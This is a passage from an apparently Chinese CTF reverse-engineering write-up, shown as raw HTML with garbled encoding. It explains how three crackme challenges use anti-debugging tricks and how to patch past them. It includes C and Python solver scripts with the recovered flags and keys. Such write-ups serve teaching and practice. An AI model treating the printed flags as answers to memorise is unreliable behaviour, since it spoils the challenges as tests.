class="number">0x3c</span>, <span class="number">0xb4</span>, <span class="number">0x5f</span>,</span><br><span class="line"> <span class="number">0x8f</span>, <span class="number">0x87</span>, <span class="number">0xae</span>, <span class="number">0x91</span>, <span class="number">0xf7</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0xd</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">flag[<span class="number">15</span>] = (a[<span class="number">15</span>] &lt;&lt; <span class="number">3</span>) | ((a[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>)&amp;<span class="number">7</span>); </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = (a[i] &lt;&lt; <span class="number">3</span>) | ((a[i+<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)&amp;<span class="number">7</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02x"</span>, flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p>ç¨‹åºå–å‡ºinpæ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œç„¶åè¿›è¡ŒåŠ å¯†åä»¥hexå½¢å¼å­˜æ”¾å…¥encæ–‡ä»¶ã€‚</p><p>å…³é”®å°±æ˜¯å…¶ä¸­çš„ä¸€ä¸ªåè°ƒè¯•ï¼š</p><p><img src="https://i.loli.net/2021/02/03/QJ1RZLqFW6Axti7.png" alt="image-20210202194810695"></p><p>é¦–å…ˆ<strong>SetUnhandledExceptionFilter</strong>å‡½æ•°çš„ä½œç”¨ï¼šè®¾ç½®é¡¶å±‚æœªå¤„ç†å¼‚å¸¸è¿‡æ»¤å™¨ï¼ˆtop-level unhandled exception filterï¼‰ï¼Œæ•è·è¿›ç¨‹çš„å„ä¸ªçº¿ç¨‹ä¸­ä¸€åˆ‡æœªè¢«å¤„ç†çš„ç»“æ„åŒ–å¼‚å¸¸ã€‚ç®€å•æ¥è¯´å°±æ˜¯ä¿®æ”¹ç³»ç»Ÿæœ€åçš„å¼‚å¸¸å¤„ç†å™¨ã€‚</p><p>ç„¶åè§¦å‘<strong>SetUnhandledExceptionFilter</strong>çš„æ¡ä»¶ï¼š</p><ul><li>ç¨‹åºä¸­æœ‰å¼‚å¸¸ï¼Œä½†æ²¡æœ‰ç›¸åº”çš„æ“ä½œæ“ä½œå»å¤„ç†è¯¥å¼‚å¸¸ã€‚</li><li>ç¨‹åºä¸å¤„äºè°ƒè¯•çŠ¶æ€ã€‚</li></ul><p><img src="https://i.loli.net/2021/02/03/qx619Tjh8yLIrHW.png" alt="image-20210202195228226"></p><p>æ»¡è¶³æ¡ä»¶åç¨‹åºå°†æ‰§è¡Œè®¾ç½®çš„å¼‚å¸¸å¤„ç†å‡½æ•°æ¥å¤„ç†è¯¥å¼‚å¸¸ã€‚</p><blockquote><p>è€Œä¸€èˆ¬ç¨‹åºä¸­è¦ä¹ˆæŠŠè®¾ç½®çš„å¼‚å¸¸å¤„ç†å‡½æ•°ç”¨æ¥æ£€æµ‹ç¨‹åºæ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€ï¼›è¦ä¹ˆéšè—ç¨‹åºçš„å…³é”®ä»£ç ï¼Œè®©æˆ‘ä»¬æ‰§è¡Œä¸åˆ°ã€‚</p></blockquote><p>å¯¹äºè§¦å‘<strong>SetUnhandledExceptionFilter</strong>çš„æ¡ä»¶ï¼Œä¸€èˆ¬ç¨‹åºåœ¨è°ƒç”¨<strong>SetUnhandledExceptionFilter</strong>åä¼šæœ‰æ•…æ„è§¦å‘å¼‚å¸¸çš„ä»£ç ï¼Œæœ¬é¢˜å°±æ˜¯é åé¢çš„æ‰§è¡Œæ— æ•ˆæŒ‡ä»¤è¿›è¡Œè§¦å‘ã€‚è€Œç¨‹åºæ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€å…¶å®æ˜¯è‹¥å‡ºç°çš„å¼‚å¸¸ä¼ é€’ç»™äº†ç¨‹åºï¼Œç¨‹åºå…ˆè°ƒç”¨UnhandledExceptionFilterï¼Œè€ŒUnhandledExceptionFilteré‡Œé¢åˆè°ƒç”¨äº†<strong>ZwQueryInformationProcess</strong>è¿›è¡Œåè°ƒè¯•æ£€æµ‹ï¼Œè®¾ç½®æ”¹å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º7ï¼Œçœ‹æ‰§è¡Œå®Œè¯¥å‡½æ•°åç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å‘çš„ç¼“å†²åŒºæ˜¯å¦ä¸º0ï¼Œè‹¥ä¸ä¸º0åˆ™ç¨‹åºå¤„äºè°ƒè¯•çŠ¶æ€ï¼Œå…¶å®å°±æ˜¯çœ‹æœ‰æ²¡æœ‰è°ƒè¯•ç«¯å£ã€‚</p><p>ç¨‹åºè½½å…¥ODï¼Œè®¾ç½®å¿½ç•¥å¼‚å¸¸ï¼Œctrl+gï¼Œè¾“å…¥å‡½æ•°åå­—æ¥åˆ°<strong>ZwQueryInformationProcess</strong>å‡½æ•°ï¼Œç„¶åä¸‹æ–­ã€‚</p><p><img src="https://i.loli.net/2021/02/03/W1ubcV5jJ9lResL.png" alt="image-20210202202155455"></p><p>ä»æ ˆçª—å£çœ‹åˆ°ç¬¬2ä¸ªå‚æ•°ä¸º7ï¼Œé‚£å°±æ˜¯è¦æ‰¾çš„äº†ï¼Œå›æº¯åˆ°è°ƒç”¨å¤„ï¼Œåœ¨å‡½æ•°æ‰§è¡Œå®Œåå°†ç›¸åº”çš„ç¼“å­˜åŒºçš„å€¼æ”¹ä¸º0å³å¯ï¼ˆè‹¥ç¨‹åºå¤šæ¬¡å‡ºç°è¿™ç§è§¦å‘å¼‚å¸¸çš„è·³è½¬ï¼Œé‚£æˆ‘ä»¬ç®€å•åœ¨æ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°åhookä¸€ä¸‹ç¨‹åºæ–¹ä¾¿äº›ï¼Œæœ¬é¢˜çš„è¯ç›´æ¥æŠŠåé¢çš„jeæ”¹ä¸ºjmpå°±å¥½äº†ï¼‰ã€‚ç»§ç»­æ‰§è¡Œï¼Œå°±åˆ°äº†æˆ‘ä»¬æƒ³æ‰§è¡Œçš„å‡½æ•°äº†ã€‚</p><p><img src="https://i.loli.net/2021/02/03/hT5x1sSw6Nlq7YJ.png" alt="image-20210202205950723"></p><p>è€Œæˆ‘åšæœ¬é¢˜çš„æ—¶å€™å¹¶æ²¡æœ‰å»è¿‡è¿™ä¸ªåè°ƒè¯•ï¼Œä½¿ç”¨çš„é™„åŠ è°ƒè¯•ï¼Œç„¶åç®€å•è°ƒè¯•äº†ä¸‹é‚£ä¸ªè®¾ç½®ä¸ºå¼‚å¸¸å¤„ç†çš„å‡½æ•°ï¼Œå‘ç°åé¢è¿˜è¦è§¦å‘å¼‚å¸¸å°±å¼€å§‹é™æ€åˆ†æã€‚</p><p>é¦–å…ˆæ‰¾åˆ°å¼•ç”¨æœ€åå­˜æ”¾åŠ å¯†æ•°æ®æ•°ç»„çš„åœ°æ–¹ï¼šå¾ˆæ˜æ˜¾å®ƒä¸Šä¸‹å…¶å®æ˜¯ä»£ç çš„ã€‚</p><p><img src="https://i.loli.net/2021/02/03/9Lk3baYopKPJzem.png" alt="image-20210202203529519"></p><p>æ‰‹åŠ¨è½¬åŒ–ä¸€ä¸‹ä¸Šé¢çš„æ•°æ®ä¸ºä»£ç ï¼ŒåŠ ä¸Šä¹‹å‰è°ƒè¯•äº†ä¸‹è®¾ç½®å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œç„¶åå¾ˆå®¹æ˜“å‘ç°ï¼Œä»£ç ä¸­æœ‰å¾ˆå¤šç”¨æ¥è§¦å‘å¼‚å¸¸çš„æ•°æ®ï¼ˆ0x0c7, 0xffï¼Œä¸”åé¢è·Ÿç€2ä¸ªæˆ–3è¿™æ“ä½œæ•°ï¼‰ã€‚</p><p>åˆåœ¨åˆ†æå¾ªç¯ä»£ç æ˜¯å‘ç°å¾ªç¯è®¡æ•°å™¨æ¯æ¬¡æ²¡æœ‰å˜ï¼Œé‚£å²‚ä¸æ— é™å¾ªç¯ï¼Œä»è¿™é‡Œåˆè¿›è€Œå‘ç°ï¼Œç¨‹åºæ¯æ¬¡è§¦å‘å¼‚å¸¸è·³åˆ°è®¾ç½®çš„å¼‚å¸¸å¤„ç†å‡½æ•°çš„ç›®çš„ï¼šè·å–å½“å‰çš„eipï¼Œä¿®æ”¹å¯„å­˜å™¨çš„å€¼ï¼Œä¿®æ”¹eipã€‚</p><p>å„ç§opcodeçš„åŠŸèƒ½ï¼š</p><p><img src="https://i.loli.net/2021/02/03/iTCalzSyQhYwrvV.png" alt="image-20210202204604400"></p><p><img src="https://i.loli.net/2021/02/03/fsUpTmPy41KqxXt.png" alt="image-20210202204621359"></p><p>å‰©ä¸‹çš„æŠŠç›¸åº”çš„è§¦å‘å¼‚å¸¸çš„ä»£ç æ›¿æ¢ä¸ºå®é™…çš„æ“ä½œï¼Œå› ä¸ºåŠ å¯†ä¸å¤æ‚ï¼Œç›´æ¥çœ‹æ±‡ç¼–ä»£ç åˆ†æä¸‹å°±å¥½äº†ã€‚</p><p>é¦–å…ˆä¸€ä¸ªé€šè¿‡æŒ‡å®šçš„indexè¿›è¡Œä¸€ä¸ªç½®æ¢æ“ä½œï¼Œç„¶åå…¸å‹çš„ç§»ä½æˆ–åŠ å¯†ï¼Œæœ€åä¸€ä¸ªå¼‚æˆ–ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ind[<span class="number">50</span>], ans[<span class="number">50</span>], tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] = &#123;<span class="number">147</span>, <span class="number">139</span>, <span class="number">143</span>, <span class="number">67</span>, <span class="number">18</span>, <span class="number">104</span>, <span class="number">247</span>,</span><br><span class="line"> <span class="number">144</span>, <span class="number">122</span>, <span class="number">75</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">180</span>, <span class="number">33</span>, <span class="number">32</span>, <span class="number">115</span>, <span class="number">141</span>, <span class="number">104</span>,</span><br><span class="line"> <span class="number">203</span>, <span class="number">25</span>, <span class="number">252</span>, <span class="number">248</span>, <span class="number">178</span>, <span class="number">107</span>, <span class="number">196</span>, <span class="number">171</span>, <span class="number">200</span>, <span class="number">155</span>, <span class="number">141</span>, <span class="number">34</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> key[] = <span class="string">"Bier"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">tmp += <span class="number">0x11</span>;</span><br><span class="line">tmp &amp;= <span class="number">0x1f</span>;</span><br><span class="line">ind[i] = tmp;</span><br><span class="line"><span class="comment">//printf("%02x ", tmp);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] ^= key[i&amp;<span class="number">0x3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] ^= enc[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ans[<span class="number">0</span>] = (enc[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) | (enc[<span class="number">31</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans[i] = (enc[i] &gt;&gt; <span class="number">3</span>) | (enc[i<span class="number">-1</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*for(i = 0; i &lt; 32; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">printf("%02x ", ans[i]);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[ind[i+<span class="number">1</span>]] = ans[ind[i]];</span><br><span class="line">flag[ind[i]] = ans[ind[i+<span class="number">1</span>]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//B0mb3_L0nd0n_m0rg3n_um_v13r_Uhr.</span></span><br></pre></td></tr></table></figure><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>æ‹¿äº†äºŒè¡€ã€‚</p><p>ç¨‹åºå…¶å®åˆ©ç”¨è°ƒç”¨å·hookäº†ç³»ç»Ÿè°ƒç”¨r3åˆ°r0çš„è½¬æ¥å±‚ï¼Œæ‰€ä»¥ä»ä¸‹å›¾ä¸­çš„v11å‡½æ•°æŒ‡é’ˆå…¶å®æ˜¯å»æ‰§è¡Œå‡ºé¢˜äººè‡ªå·±è®¾ç½®çš„å‡½æ•°ã€‚</p><p><img src="https://i.loli.net/2021/02/03/ofAZ4YKhuGjDcR8.png" alt="image-20210202211546712"></p><p>ç®€å•è·Ÿè¿›è¡Œä¸€ä¸‹v11æŒ‡å‘çš„å‡½æ•°ï¼šå¼€å§‹å¯¹å­—ç¬¦è§£å¯†å¾—åˆ°æ¨¡å—å’Œå‡½æ•°åï¼Œå°±æ˜¯ä¸ºäº†å¾—åˆ°å‡½æ•°<strong>NtSetInformationThread</strong>æ¥è¿›è¡Œåè°ƒè¯•ã€‚</p><p><img src="https://i.loli.net/2021/02/03/nph5lyftBDePWmZ.png" alt="image-20210202212312718"></p><p>å¯¹äºè¿™ä¸ªåè°ƒè¯•ä¹‹å‰æ€»ç»“è¿‡ï¼š</p><p><img src="https://i.loli.net/2021/02/03/MxtYpIG8fNWUDyh.png" alt="image-20210202212558373"></p><p>è¿™é‡Œè¦è¿‡å®ƒç›´æ¥patchæ‰å°±å¥½äº†ã€‚</p><p>ç„¶åå°±æ˜¯ä¸€äº›åŠ è½½dllå’Œå‡½æ•°ä»£ç è§£å¯†ç›¸å…³çš„æ“ä½œï¼Œåšé¢˜æ—¶èŠ‚çœæ—¶é—´æ²¡ç®¡ï¼Œç°åœ¨è¿˜æ˜¯çœ‹çœ‹ï¼š</p><p><img src="https://i.loli.net/2021/02/03/KdMh8I6VLunaZJC.png" alt="image-20210202213212377"></p><p>ä½¿ç”¨èµ„æºæŸ¥çœ‹å·¥å…·ï¼Œæ‰¾åˆ°ç¨‹åºèµ„æºä¸­æ”¹dllï¼Œæ˜æ˜¾çœ‹åˆ°æ˜¯éœ€è¦è¿›è¡Œè§£å¯†çš„ï¼Œä¹Ÿå°±æ˜¯åé¢çš„æ“ä½œã€‚</p><p><img src="https://i.loli.net/2021/02/03/t7HSrVNwjb9qZBJ.png" alt="image-20210202213458322"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œçœ‹åˆ°è§£å¯†æ“ä½œåªæ˜¯ä¸€ä¸ªå¼‚æˆ–ï¼š<br><img src="https://i.loli.net/2021/02/03/ysgJIf6lP5uRk1i.png" alt="image-20210202213645891"></p><p>è‡³äºåé¢çš„æ“ä½œå°±æ˜¯å¾—åˆ°ç›¸å…³çš„å‡½æ•°åœ°å€ç­‰ã€‚</p><p>æœ€åè·Ÿåˆ°æœ€åçš„åŠ å¯†å‡½æ•°ï¼šå­—ç¬¦ä¸²å°±æç¤ºäº†sm4å¯†ç ï¼Œä¸”é•¿åº¦æ˜¯16ï¼Œé‚£è¿™ä¸ªå°±æ˜¯keyäº†ã€‚sm4å¯†ç ä»å¸¸é‡0xA3B1BAC6ä¹Ÿå¯ä»¥è¯†åˆ«å‡ºæ¥ã€‚</p><p><img src="https://i.loli.net/2021/02/03/UFJ7TvwXNgWRxt4.png" alt="image-20210202214023629"></p><p>è¿™é‡ŒæŠŠ32çš„inputåˆ†2æ¬¡åŠ å¯†çš„ï¼Œæ¯æ¬¡16ä½ã€‚ä½¿ç”¨å¯†æ–‡è§£å¯†ä¸€ä¸‹å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = bytes([<span class="number">234</span>,  <span class="number">99</span>,  <span class="number">88</span>, <span class="number">183</span>, <span class="number">140</span>, <span class="number">226</span>, <span class="number">161</span>, <span class="number">233</span>, <span class="number">197</span>,  <span class="number">41</span>, </span><br><span class="line">  <span class="number">143</span>,  <span class="number">83</span>, <span class="number">232</span>,   <span class="number">8</span>,  <span class="number">50</span>,  <span class="number">89</span>, <span class="number">175</span>,  <span class="number">27</span>, <span class="number">103</span>, <span class="number">174</span>, </span><br><span class="line">  <span class="number">217</span>, <span class="number">218</span>, <span class="number">207</span>, <span class="number">196</span>, <span class="number">114</span>, <span class="number">255</span>, <span class="number">177</span>, <span class="number">236</span>, <span class="number">118</span>, <span class="number">115</span>, </span><br><span class="line">  <span class="number">243</span>, <span class="number">6</span>])</span><br><span class="line">key = <span class="string">b'Ez_5M4_C1pH@r!!!'</span></span><br><span class="line">key = bytes_to_long(key)</span><br><span class="line">c1 = bytes_to_long(c[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">c2 = bytes_to_long(c[<span class="number">16</span>:<span class="number">32</span>])</span><br><span class="line"></span><br><span class="line">flag1 = decrypt(c1, key)</span><br><span class="line">flag2 = decrypt(c2, key)</span><br><span class="line">flag = long_to_bytes(flag1)+long_to_bytes(flag2)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#42b061b4cb41cfa89ca78047bde1856e</span></span><br></pre></td></tr></table></figure><h3 id="child-protect"><a href="#child-protect" class="headerlink" title="child_protect"></a>child_protect</h3><p>æ‹¿äº†äºŒè¡€ã€‚ã€‚</p><p>ä»é¢˜ç›®åå­—å°±æƒ³åˆ°è€ƒç‚¹å¯èƒ½æ˜¯ç¨‹åºè‡ªæˆ‘åˆ›å»ºåè°ƒè¯•ï¼Œå‡çº§ä¸€ç‚¹å°±æ˜¯Debug BlockeræŠ€æœ¯ã€‚å°è¯•ä¸‹äº†æ–­ç‚¹ï¼Œå‘ç°ä¸ä¼šæ–­ä¸‹ã€‚ç„¶åä½¿ç”¨</p><p>procexpæŸ¥çœ‹ç¨‹åºï¼šæœç„¶ï¼Œæ­£å¦‚é¢˜ç›®åå­—ã€‚</p><p><img src="https://i.loli.net/2021/02/03/NFq5Iep92wZAPGv.png" alt="image-20210202222147793"></p><blockquote><p><strong>Debug BlockeræŠ€æœ¯ç‰¹ç‚¹ï¼š</strong></p><ul><li><strong>è°ƒè¯•å™¨ä¸è¢«è°ƒè¯•å™¨å…³ç³»ä¸­ï¼Œè°ƒè¯•è¿›ç¨‹ä¸è¢«è°ƒè¯•è¿›ç¨‹é¦–å…ˆæ˜¯ä¸€ç§çˆ¶å­å…³ç³»ã€‚</strong></li><li><strong>å­è¿›ç¨‹è¿›ç¨‹å·²ç»è¢«è°ƒè¯•ï¼Œä¸èƒ½åœ¨è¢«å…¶ä»–è°ƒè¯•å™¨è°ƒè¯•</strong></li><li><strong>å¼ºåˆ¶ç»ˆæ­¢è°ƒè¯•è¿›ç¨‹ä»¥åˆ‡æ–­è°ƒè¯•å™¨-è¢«è°ƒè¯•å™¨å…³ç³»æ—¶ï¼Œè¢«è°ƒè¯•è¿›ç¨‹ä¹Ÿä¼šåŒæ—¶ç»ˆæ­¢ã€‚</strong></li><li><strong>çˆ¶è¿›ç¨‹æ“ä½œè¢«å­è¿›ç¨‹çš„ä»£ç </strong></li><li><strong>çˆ¶è¿›ç¨‹å¤„ç†è¢«å­è¿›ç¨‹ä¸­å‘ç”Ÿçš„å¼‚å¸¸</strong></li></ul></blockquote><p>æ¥åˆ°creatprocesså‡½æ•°çš„åœ°æ–¹çœ‹çœ‹ï¼šé¦–å…ˆåˆ›å»ºä¸€ä¸ªäº’æ–¥ä½“ï¼Œç›®çš„æ˜¯ä¸ºäº†åŒºåˆ«å½“å‰è¿è¡Œçš„æ˜¯å­è¿›ç¨‹è¿˜æ˜¯çˆ¶è¿›ç¨‹ï¼Œè¿›è€Œæ‰§è¡Œä¸åŒçš„åˆ†æ”¯ã€‚æ¥ä¸‹æ¥åˆ›å»ºäº†ä¸€ä¸ªè¿›ç¨‹ã€‚<br><img src="https://i.loli.net/2021/02/03/dtHyc9rBTIlAVXu.png" alt="image-20210202222344171"></p><p><img src="https://i.loli.net/2021/02/03/AUKzcsI8Wl6R1Sx.png" alt="image-20210202223940336"></p><p>ç„¶åå°±æ˜¯å­è¿›ç¨‹ä¸çˆ¶è¿›ç¨‹äº¤äº’çš„è¿‡ç¨‹ï¼š<br><img src="https://i.loli.net/2021/02/03/Gykoqiu7s1fL3Zg.png" alt="image-20210202224313171"></p><p>å…·ä½“äº¤äº’è¿‡ç¨‹ï¼šå¯ä»¥çœ‹åˆ°å°±2ä¸ªï¼Œé‚£æˆ‘ä»¬ä¸ç”¨æŠŠç¨‹åºè°ƒè¯•èµ·æ¥ï¼Œç›´æ¥æ‰‹åŠ¨æˆ–idapythonä¿®æ”¹å­è¿›ç¨‹å°±è¡Œäº†ã€‚</p><p><img src="https://i.loli.net/2021/02/03/sFOHkW1pPUYeGQJ.png" alt="image-20210202224637602"></p><p>ç¬¬ä¸€ä¸ªå°±å½“ä½œèŠ±æŒ‡ä»¤å¤„ç†nopæ‰å¤šä½™ä»£ç ï¼Œå¯¹äºç¬¬äºŒä¸ªï¼šå…¶å®å°±æ˜¯æŠŠå‡½æ•°ä¸­çš„0x8e32cdaaä¿®æ”¹ä¸º0x73FF8CA6ã€‚</p><p><img src="https://i.loli.net/2021/02/03/zM9IE7ajLCnZOJW.png" alt="image-20210202225101786"></p><p>æŠŠä¿®å¤å¥½çš„ä»£ç åç¼–è¯‘ï¼š</p><p><img src="https://i.loli.net/2021/02/03/mzFKL9OIEYrMt7y.png" alt="image-20210202225507005"></p><p>å¯¹äºç”Ÿæˆçš„keyï¼Œå› ä¸ºè®¡ç®—æœ‰ç‚¹ç¹çï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥åœ¨ç¨‹åºè¿è¡Œæ—¶ä¿®æ”¹eipåˆ°sub_4110B9å‡½æ•°è¿™é‡Œï¼Œç„¶åå½“ç¨‹åºæ‰§è¡Œåˆ°åé¢æ—¶ç›´æ¥æŸ¥çœ‹keyã€‚</p><p>æœ€åçš„teaåŠ å¯†ï¼Œåªæ˜¯å¤šäº†ä¸€ä¸ªå˜æ¢å­—èŠ‚åºçš„æ“ä½œï¼Œå†™è§£å¯†æ—¶æ³¨æ„ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/02/03/JDPd89soM2nTCh5.png" alt="image-20210202225850439"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] = &#123;<span class="number">0xed</span>, <span class="number">0xe9</span>, <span class="number">0x8b</span>, <span class="number">0x3b</span>, <span class="number">0xd2</span>, <span class="number">0x85</span>, <span class="number">0xe7</span>, <span class="number">0xeb</span>, <span class="number">0x51</span>, <span class="number">0x16</span>, <span class="number">0x50</span>, <span class="number">0x7a</span>, <span class="number">0xb1</span>, <span class="number">0xdc</span>, <span class="number">0x5d</span>, <span class="number">0x9</span>, <span class="number">0x45</span>, <span class="number">0xae</span>, <span class="number">0xb9</span>, <span class="number">0x15</span>, <span class="number">0x4d</span>, <span class="number">0x8d</span>, <span class="number">0xff</span>, <span class="number">0x50</span>,</span><br><span class="line"> <span class="number">0xde</span>, <span class="number">0xe0</span>, <span class="number">0xbc</span>, <span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xbc</span>, <span class="number">0xfe</span>, <span class="number">0xe1</span>&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[] = &#123;<span class="number">0x82ABA3FE</span>, <span class="number">0x0AC1DDCA8</span>, <span class="number">0x87EC6B60</span>, <span class="number">0x0A2394568</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> enc[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = enc[i];</span><br><span class="line">enc[i] = enc[<span class="number">3</span>-i];</span><br><span class="line">enc[<span class="number">3</span>-i] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v11 = <span class="number">0x73FF8CA6</span>, j = 